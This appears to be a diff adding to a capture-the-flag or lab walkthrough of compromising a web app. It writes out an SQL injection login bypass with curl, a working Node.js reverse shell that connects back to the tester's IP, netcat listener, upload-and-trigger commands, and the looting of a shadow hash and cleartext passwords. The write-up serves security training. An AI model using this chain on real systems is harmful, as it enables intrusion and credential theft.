@@ -59,6 +59,81 @@ At this page there is a username and a password field. After entering
 admin' OR 1=1 -- -> username 
 "anything" -> password 
 
+Time to save the session cookie into a cookie.txt file 
+curl -s -i -c cookies.txt http://192.168.11.200/login   --data-urlencode "username=admin' OR 1=1 -- -"   --data-urlencode "password=anything"
+With that cookie I am able to curl request the /dashboard to see all the details 
+
 I was able to login makign the username and password fields weak to SQL injections. I am now logged in as admin 
 On this page there is an option to submit a file. I was able to submit a blank file called test.txt. 
 There were already pre loaded files such as test2.txt and script.ts 
+
+Now authenticated via the saved cookie, I enumerated the dashboard and file routes. The dashboard listed an upload form (POST /upload), a preview route (/preview/<file>), rename, and delete, plus a pre-existing shell.js file — a hint that JavaScript files are treated specially.
+
+Testing the preview route for code execution
+
+Previewing shell.js returned {} (an empty module export), which was the tell: the /preview route doesn’t just display .js files, it executes them server-side. I confirmed this against the app logic later, but the behaviour alone pointed to a Node.js code-execution vector via require().
+
+Getting a reverse shell
+
+I identified my VPN (tun0) IP as the callback address:
+
+bash
+ip addr show tun0      # 192.168.21.3
+
+I created a Node.js reverse shell, rev.js:
+
+javascript
+(function(){
+  var net = require("net"),
+      cp = require("child_process"),
+      sh = cp.spawn("/bin/sh", []);
+  var client = new net.Socket();
+  client.connect(4444, "192.168.21.3", function(){
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+})();
+
+Started a listener, uploaded the payload with the authenticated cookie, and triggered it via preview:
+
+bash
+nc -lvnp 4444
+curl -s -b cookies.txt -F "file=@rev.js" http://192.168.11.200/upload
+curl -s -b cookies.txt http://192.168.11.200/preview/rev.js   # detonates it
+
+The listener caught the shell as the node service account:
+
+Connection received on 192.168.11.200 37610
+whoami  → node
+id      → uid=996(node) gid=996(node)
+
+Stabilised the shell:
+
+bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z ; stty raw -echo; fg ; Enter x2 ; export TERM=xterm
+
+Looting the application
+
+The app lived in /opt/app. Reviewing the source confirmed both vulnerabilities and revealed a backup/ and db/ directory:
+
+bash
+cat /opt/app/app.js
+SQLi: `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'` — raw string concatenation, confirming the admin' OR 1=1 -- - bypass.
+RCE: the /preview/:filename route calls require(filePath) on .js files, executing them — the exact vector used by rev.js.
+
+The real prizes were the backup and database files:
+
+bash
+cat /opt/app/backup/shadow.bak
+svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
+
+A $6$ (SHA-512 crypt) hash for the Linux user svc-drop — the likely SSH credential.
+bash
+cat /opt/app/db/deaddrop.db
+
+The SQLite users table held two cleartext application logins:
+
+svc-backup : BackupAgent2024
+admin      : SuperSecretAdm1n!
